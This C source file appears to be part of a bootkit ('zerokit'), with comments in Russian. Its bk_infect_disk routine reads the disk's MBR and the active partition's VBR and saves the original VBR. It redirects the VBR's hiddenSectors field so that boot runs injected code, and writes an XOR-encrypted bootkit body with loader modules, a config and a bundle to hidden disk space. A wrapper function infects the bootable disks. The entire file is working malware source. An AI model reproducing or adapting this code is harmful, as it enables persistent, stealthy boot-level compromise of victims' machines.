#include "..\..\..\loader\mod_shared\zerokit.h"

int bk_infect_disk(uint32_t diskNum, int begin)
{
	int ret;
	bk_mbr_t origMBR;
	bk_ntfs_vbr_t ntfsVBR;
	uint64_t diskSize;
	uint64_t max_end;
	uint64_t min_str;
	uint64_t bkBodyOffset;
	ppartition_table_entry_t pPartEntry;
	ppartition_table_entry_t pActivePartEntry = NULL;
	uint8_t* pNewData = NULL;
	uint8_t* pRealData = NULL;
	int realSize, i, bkSize, ldr32Size, ldr64Size, configSize, bundleSize;
	pdisk_info_t pDiskInfo = NULL;
	uint8_t* pPayload = globalData.gPayload + sizeof(exploit_startup_header_t);
	pzerokit_header_t pRealPayloadHeader, pPayloadHeader = (pzerokit_header_t)(pPayload + 1024 + 2);
	pmods_pack_header_t pMods32Hdr, pMods64Hdr;
	pmod_header_t pModHeader;
	ploader32_info_t pLdr32Info;
	ploader64_info_t pLdr64Info;
	uint16_t bkPadSize;
	uint16_t bkKeyOffset;
	pbios_dap_t pOrigVbrDap;
	uint32_t diff;

	do {
		if ((pDiskInfo = bk_disk_open(diskNum)) == NULL) {
			//INLOG("Can't open disk", diskNum);
			ret = ERROR_BK_UNKNOWN;
			break;
		}

		if (IS_INVALID_SECTOR_SIZE(pDiskInfo->bytesPerSec) != 0) {
			ret = ERROR_UNSUPPORTED_SECTOR_SIZE;
			break;
		}

		pMods32Hdr = (pmods_pack_header_t)(pPayload + pPayloadHeader->sizeOfBootkit);
		pMods64Hdr = (pmods_pack_header_t)((uint8_t*)pMods32Hdr + sizeof(mods_pack_header_t) + pMods32Hdr->sizeOfPack);

		// Выравниваем размер тела буткита до размера сектора.
		bkSize = pPayloadHeader->sizeOfBootkit - 2/*pad size*/ - 2/*key offset*/;
		ldr32Size = _ALIGN(pMods32Hdr->sizeOfPack, SECTOR_SIZE);
		ldr64Size = _ALIGN(pMods64Hdr->sizeOfPack, SECTOR_SIZE);
		configSize = _ALIGN(pPayloadHeader->sizeOfConfig, SECTOR_SIZE);
		bundleSize = _ALIGN(pPayloadHeader->sizeOfBundle, SECTOR_SIZE);
		realSize = bkSize + ldr32Size + ldr64Size + configSize + bundleSize;
		pNewData = fn_VirtualAlloc(0, SECTOR_SIZE + realSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // 512 - первый сектор оригинального VBR.

		if (pNewData == NULL) {
			//INLOG("Can't allocate memory for bootkit content", 0);
			ret = ERROR_NO_MEMORY;
			break;
		}

		pRealData = pNewData + SECTOR_SIZE;

		bkPadSize = *(uint16_t*)(pPayload + bkSize);
		bkKeyOffset = *(uint16_t*)(pPayload + bkSize + 2);

		__stosb(pRealData, 0, realSize);
		// Копируем буткит.
		__movsb(pRealData, pPayload, bkSize);

		pLdr32Info = (ploader32_info_t)(pRealData + bkSize - bkPadSize - pPayloadHeader->sizeOfBkPayload64 - sizeof(loader32_info_t));
		__stosb(pLdr32Info, 0, sizeof(loader32_info_t));
		pLdr64Info = (ploader64_info_t)(pRealData + bkSize - bkPadSize - sizeof(loader64_info_t));
		__stosb(pLdr64Info, 0, sizeof(loader64_info_t));

		// Копируем пак с 32-битными модами.
		pModHeader = (pmod_header_t)(pRealData + bkSize);
		__movsb(pModHeader, (uint8_t*)pMods32Hdr + sizeof(mods_pack_header_t), pMods32Hdr->sizeOfPack);
		pModHeader->confOffset = ldr32Size + ldr64Size;
		pModHeader->confSize = configSize;

		// Копируем 64-битную часть.
		pModHeader = (pmod_header_t)(pRealData + bkSize + ldr32Size);
		__movsb(pModHeader, (uint8_t*)pMods64Hdr + sizeof(mods_pack_header_t), pMods64Hdr->sizeOfPack);
		pModHeader->confOffset = ldr64Size;
		pModHeader->confSize = configSize;

		// Копируем конфигурационный блок.
		__movsb(pRealData + bkSize + ldr32Size + ldr64Size, (uint8_t*)pMods64Hdr + sizeof(mods_pack_header_t) + pMods64Hdr->sizeOfPack, pPayloadHeader->sizeOfConfig);

		// Копируем бандл.
		__movsb(pRealData + bkSize + ldr32Size + ldr64Size + configSize, (uint8_t*)pMods64Hdr + sizeof(mods_pack_header_t) + pMods64Hdr->sizeOfPack + pPayloadHeader->sizeOfConfig, pPayloadHeader->sizeOfBundle);

		pLdr32Info->loaderSize = ldr32Size/* + ldr64Size + configSize*/;
		pLdr64Info->loaderSize = ldr64Size/* + configSize*/;

		pRealPayloadHeader = (pzerokit_header_t)(pRealData + 1024 + 2);
		__movsb(pRealPayloadHeader, pPayloadHeader, sizeof(zerokit_header_t));
		pRealPayloadHeader->sizeOfBootkit = bkSize;
		pRealPayloadHeader->sizeOfPack = realSize - configSize - bundleSize + 512;
		pRealPayloadHeader->sizeOfConfig = configSize;
		pRealPayloadHeader->sizeOfBundle = bundleSize;

		// Получаем размер диска.
		if ((diskSize = dc_dsk_get_size(diskNum, 1)) == 0) {
			//INLOG("Can't obtain disk size", 0);
			ret = ERROR_BK_IO;
			break;
		}

		// Считываем оригинальный MBR.
		if ((ret = bk_disk_read(pDiskInfo, &origMBR, sizeof(origMBR), 0)) != ERROR_NONE) {
			//INLOG("Can't read original MBR", 0);
			break;
		}

		if ((origMBR.magic != 0xAA55) || (bk_check_fs_type((uint8_t*)&origMBR) != FS_UNK)) {
			ret = ERROR_BK_MBR;
			break;
		}

		// Ищем свободное место перед разделом и после.
		min_str = 64;
		max_end = 0;
		for (i = 0, max_end = 0; i < 4; ++i)  {
			if ((pPartEntry = &origMBR.pt[i])->totalSects == 0) { // пропускаем пустые разделы
				continue;
			}

			if (pPartEntry->active == 0x80) {
				pActivePartEntry = pPartEntry;
			}

			min_str = min(min_str, pPartEntry->startSect);
			max_end = max(max_end, pPartEntry->startSect + pPartEntry->totalSects);
		}
#ifdef _WIN64
		max_end *= (uint64_t)pDiskInfo->bytesPerSec;
		min_str *= (uint64_t)pDiskInfo->bytesPerSec;
#else
		max_end = fn__allmul(max_end, (uint64_t)pDiskInfo->bytesPerSec);
		min_str = fn__allmul(min_str, (uint64_t)pDiskInfo->bytesPerSec);
#endif // _WIN64

		if (begin != 0) {
			if (min_str < realSize + SECTOR_SIZE) {
				ret = ERROR_BK_NO_SPACE;
				break;
			}
			bkBodyOffset = SECTOR_SIZE;
		}
		else {
			bkBodyOffset = diskSize - realSize - (FREE_SPACE_AFTER * SECTOR_SIZE); // Записываем тело буткита с конца и оставляем 64 сектора.

			if (max_end > bkBodyOffset) {
				ret = ERROR_BK_NO_SPACE;
				break;
			}
		}

		if (pActivePartEntry == NULL) {
			ret = ERROR_BK_BOOT_DISK_NOT_FOUND;
			break;
		}

		// Загружаем VBR.
#ifdef _WIN64
		if ((ret = bk_disk_read(pDiskInfo, &ntfsVBR, sizeof(ntfsVBR), (uint64_t)pActivePartEntry->startSect * SECTOR_SIZE)) != ERROR_NONE) {
#else
		if ((ret = bk_disk_read(pDiskInfo, &ntfsVBR, sizeof(ntfsVBR), fn__allmul((uint64_t)pActivePartEntry->startSect, SECTOR_SIZE))) != ERROR_NONE) {
#endif // _WIN64
			//INLOG("Can't read VBR", 0);
			break;
		}

		// Проверяем, не установлены ли мы уже.
		diff = (ntfsVBR.bpb.hiddenSectors > pActivePartEntry->startSect ? ntfsVBR.bpb.hiddenSectors - pActivePartEntry->startSect : pActivePartEntry->startSect - ntfsVBR.bpb.hiddenSectors);
		if (diff > 511) {
			bk_ntfs_vbr_t realVBR;
			if ((ret = bk_disk_read(pDiskInfo, &realVBR, sizeof(realVBR), bkBodyOffset)) != ERROR_NONE) {
				//INLOG("Can't read VBR", 0);
				break;
			}

			if ((*((uint64_t*)realVBR.oemName) == 0x202020205346544EULL || *((uint64_t*)realVBR.oemName) == 0x302E35534F44534DULL) && realVBR.endOfSectorMarker == 0xAA55) {
				ret = ERROR_BK_ALREADY_INSTALLED;
				// Мы уже установлены - завершаемся.
				break;
			}
		}

		// Сохраняем оригинальный VBR.
		__movsb(pNewData, &ntfsVBR, sizeof(ntfsVBR));
#ifdef _WIN64
		ntfsVBR.bpb.hiddenSectors = (uint32_t)(bkBodyOffset / SECTOR_SIZE);
#else
		ntfsVBR.bpb.hiddenSectors = (uint32_t)fn__aulldiv(bkBodyOffset, SECTOR_SIZE);
#endif // _WIN64
		//         if (*((uint64_t*)ntfsVBR.oemName) == 0x202020205346544EULL) { // NTFS VBR
		// 
		//         }
		//         else
		if (*((uint64_t*)ntfsVBR.oemName) == 0x302E35534F44534DULL) { // FAT32 VBR
			ntfsVBR.bpb.hiddenSectors -= 0x0C - 2; // запуск в FAT32 сразу с нужного сектора.
		}

		// Записываем модифицированный VBR.
#ifdef _WIN64
		if ((ret = bk_disk_write(pDiskInfo, &ntfsVBR, sizeof(ntfsVBR), (uint64_t)pActivePartEntry->startSect * SECTOR_SIZE)) != ERROR_NONE) {
#else
		if ((ret = bk_disk_write(pDiskInfo, &ntfsVBR, sizeof(ntfsVBR), fn__allmul((uint64_t)pActivePartEntry->startSect, SECTOR_SIZE))) != ERROR_NONE) {
#endif // _WIN64
			//INLOG("Can't write modified VBR", 0);
			break;
		}

		pLdr32Info->loaderOffset = bkBodyOffset + 512 + bkSize;
		pLdr64Info->loaderOffset = pLdr32Info->loaderOffset + ldr32Size;
#ifdef _WIN64
		pLdr32Info->startSector = pLdr64Info->startSector = (uint32_t)(bkBodyOffset / SECTOR_SIZE);
#else
		pLdr32Info->startSector = pLdr64Info->startSector = (uint32_t)fn__aulldiv(bkBodyOffset, SECTOR_SIZE);

#endif // _WIN64

		// Смещение до оригинального загрузочного VBR.
		pOrigVbrDap = (pbios_dap_t)(pRealData + 512 + 2);
		*((uint32_t*)&pOrigVbrDap->sector) = pActivePartEntry->startSect;
		// Смещение до тела буткита.
		++pOrigVbrDap;
		*((uint32_t*)&pOrigVbrDap->sector) = pLdr32Info->startSector;

		// Подсчитываем hash и шифруем буткит, начиная с 512 байта.
		{
			uint32_t crcVal = 0;
			uint8_t* itr = pRealData + 1024 + 2 + sizeof(zerokit_header_t);
			uint8_t* end = pRealData + bkSize - 4;
			uint8_t* zbkKeyItr = pPayload + bkKeyOffset - 512;
			uint8_t* keyItr = zbkKeyItr;

			for (; itr < end; ++itr) {
				crcVal = rol(crcVal, 7);
				*((uint8_t*)&crcVal) ^= *itr;
			}

			*((uint32_t*)itr) = crcVal;

			end += 4;
			for (itr = pRealData + 1024 + 2 + sizeof(zerokit_header_t); itr < end; ++itr) {
				*itr ^= *keyItr;

				++keyItr;
				if ((keyItr - zbkKeyItr) >= 64) {
					keyItr = zbkKeyItr;
				}
			}
		}

		// Записываем тело буткита.
		if ((ret = bk_disk_write(pDiskInfo, pNewData, 512 + realSize, bkBodyOffset)) != ERROR_NONE) {
			//INLOG("Can't write bootkit body", 0);
			break;
		}
		} while (0);

	if (pDiskInfo != NULL) {
		bk_disk_close(pDiskInfo);
	}

	if (pNewData != NULL) {
		fn_VirtualFree(pNewData, 512 + realSize, MEM_RELEASE);
	}

	return ret;
		}

int bk_infect(int begin)
{
	int ret;
	uint32_t diskNum1, diskNum2;

	ret = raw_get_bootable_disk(&diskNum1, &diskNum2);

	if (ret == ERROR_NONE) {
		ret = bk_infect_disk(diskNum1, begin);

		if ((ret == ERROR_NONE) && (diskNum1 != diskNum2)) {
			ret = bk_infect_disk(diskNum2, begin);
		}
	}

	return ret;
}
